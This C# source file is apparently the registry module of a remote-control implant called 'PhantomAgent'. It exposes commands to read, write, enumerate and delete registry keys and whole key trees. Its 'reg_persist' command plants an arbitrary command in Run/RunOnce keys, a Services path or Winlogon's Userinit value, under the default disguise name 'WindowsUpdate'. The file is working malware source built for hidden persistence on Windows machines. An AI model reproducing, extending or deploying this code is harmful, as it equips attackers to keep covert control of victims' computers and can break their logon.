using System.Runtime.InteropServices;
using System.Text.Json;
using Microsoft.Win32;

namespace PhantomAgent.Modules;

public static class RegistryModule
{
    public const string Name = "registry";

    public static Dictionary<string, Func<Dictionary<string, JsonElement>?, object>> GetCommands()
    {
        return new Dictionary<string, Func<Dictionary<string, JsonElement>?, object>>
        {
            ["reg_read"] = args => RegRead(GetString(args, "path"), GetStringOpt(args, "name")),
            ["reg_write"] = args => RegWrite(GetString(args, "path"), GetString(args, "name"),
                                              GetString(args, "value"), GetStringOpt(args, "type") ?? "REG_SZ"),
            ["reg_delete"] = args => RegDelete(GetString(args, "path"), GetStringOpt(args, "name")),
            ["reg_enum"] = args => RegEnum(GetString(args, "path")),
            ["reg_persist"] = args => RegPersistence(GetString(args, "command"), GetStringOpt(args, "name") ?? "WindowsUpdate",
                                                      GetStringOpt(args, "location") ?? "run"),
        };
    }

    private static (RegistryKey root, string subPath) ParsePath(string path)
    {
        // Parse "HKLM\SOFTWARE\..." or "HKCU\..." format
        int sep = path.IndexOf('\\');
        if (sep < 0) throw new ArgumentException($"Invalid registry path: {path}");

        string hive = path[..sep].ToUpperInvariant();
        string sub = path[(sep + 1)..];

        RegistryKey root = hive switch
        {
            "HKLM" or "HKEY_LOCAL_MACHINE" => Registry.LocalMachine,
            "HKCU" or "HKEY_CURRENT_USER" => Registry.CurrentUser,
            "HKU" or "HKEY_USERS" => Registry.Users,
            "HKCR" or "HKEY_CLASSES_ROOT" => Registry.ClassesRoot,
            "HKCC" or "HKEY_CURRENT_CONFIG" => Registry.CurrentConfig,
            _ => throw new ArgumentException($"Unknown hive: {hive}"),
        };

        return (root, sub);
    }

    private static Dictionary<string, object> RegRead(string path, string? valueName)
    {
        var (root, sub) = ParsePath(path);
        using var key = root.OpenSubKey(sub);
        if (key == null)
            throw new FileNotFoundException($"Registry key not found: {path}");

        if (valueName != null)
        {
            object? val = key.GetValue(valueName);
            return new Dictionary<string, object>
            {
                ["path"] = path,
                ["name"] = valueName,
                ["value"] = val?.ToString() ?? "",
                ["kind"] = key.GetValueKind(valueName).ToString(),
            };
        }

        // Read all values in the key
        var values = new Dictionary<string, object>();
        foreach (string name in key.GetValueNames())
        {
            values[name] = new Dictionary<string, string>
            {
                ["value"] = key.GetValue(name)?.ToString() ?? "",
                ["kind"] = key.GetValueKind(name).ToString(),
            };
        }
        return new Dictionary<string, object>
        {
            ["path"] = path,
            ["values"] = values,
        };
    }

    private static Dictionary<string, object> RegWrite(string path, string name, string value, string type)
    {
        var (root, sub) = ParsePath(path);
        using var key = root.CreateSubKey(sub, writable: true);
        if (key == null)
            throw new InvalidOperationException($"Cannot create/open key: {path}");

        RegistryValueKind kind = type.ToUpperInvariant() switch
        {
            "REG_SZ" or "SZ" or "STRING" => RegistryValueKind.String,
            "REG_DWORD" or "DWORD" => RegistryValueKind.DWord,
            "REG_QWORD" or "QWORD" => RegistryValueKind.QWord,
            "REG_BINARY" or "BINARY" => RegistryValueKind.Binary,
            "REG_EXPAND_SZ" or "EXPAND_SZ" => RegistryValueKind.ExpandString,
            "REG_MULTI_SZ" or "MULTI_SZ" => RegistryValueKind.MultiString,
            _ => RegistryValueKind.String,
        };

        object writeValue = kind switch
        {
            RegistryValueKind.DWord => int.Parse(value),
            RegistryValueKind.QWord => long.Parse(value),
            RegistryValueKind.Binary => Convert.FromHexString(value.Replace(" ", "")),
            RegistryValueKind.MultiString => value.Split('|'),
            _ => value,
        };

        key.SetValue(name, writeValue, kind);

        return new Dictionary<string, object>
        {
            ["path"] = path,
            ["name"] = name,
            ["value"] = value,
            ["type"] = kind.ToString(),
        };
    }

    private static Dictionary<string, object> RegDelete(string path, string? valueName)
    {
        var (root, sub) = ParsePath(path);

        if (valueName != null)
        {
            using var key = root.OpenSubKey(sub, writable: true);
            if (key == null)
                throw new FileNotFoundException($"Registry key not found: {path}");
            key.DeleteValue(valueName, throwOnMissingValue: false);

            return new Dictionary<string, object>
            {
                ["path"] = path,
                ["name"] = valueName,
                ["deleted"] = true,
            };
        }

        root.DeleteSubKeyTree(sub, throwOnMissingSubKey: false);
        return new Dictionary<string, object>
        {
            ["path"] = path,
            ["deleted_tree"] = true,
        };
    }

    private static Dictionary<string, object> RegEnum(string path)
    {
        var (root, sub) = ParsePath(path);
        using var key = root.OpenSubKey(sub);
        if (key == null)
            throw new FileNotFoundException($"Registry key not found: {path}");

        return new Dictionary<string, object>
        {
            ["path"] = path,
            ["subkeys"] = key.GetSubKeyNames(),
            ["values"] = key.GetValueNames(),
            ["subkey_count"] = key.SubKeyCount,
            ["value_count"] = key.ValueCount,
        };
    }

    // Write persistence to common autorun registry locations
    private static Dictionary<string, object> RegPersistence(string command, string name, string location)
    {
        string regPath = location.ToLowerInvariant() switch
        {
            "run" => @"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
            "runonce" => @"HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce",
            "run_hklm" => @"HKLM\Software\Microsoft\Windows\CurrentVersion\Run",
            "runonce_hklm" => @"HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce",
            "winlogon" => @"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
            "services" => @"HKLM\SYSTEM\CurrentControlSet\Services",
            _ => throw new ArgumentException($"Unknown persistence location: {location}"),
        };

        string valueName = location.StartsWith("winlogon", StringComparison.OrdinalIgnoreCase)
            ? "Userinit"
            : name;

        return RegWrite(regPath, valueName, command, "REG_SZ");
    }

    private static string GetString(Dictionary<string, JsonElement>? args, string key)
    {
        if (args == null || !args.TryGetValue(key, out var val))
            throw new ArgumentException($"Missing required argument: {key}");
        return val.GetString() ?? throw new ArgumentException($"Null value for: {key}");
    }

    private static string? GetStringOpt(Dictionary<string, JsonElement>? args, string key)
    {
        if (args == null || !args.TryGetValue(key, out var val)) return null;
        return val.GetString();
    }
}
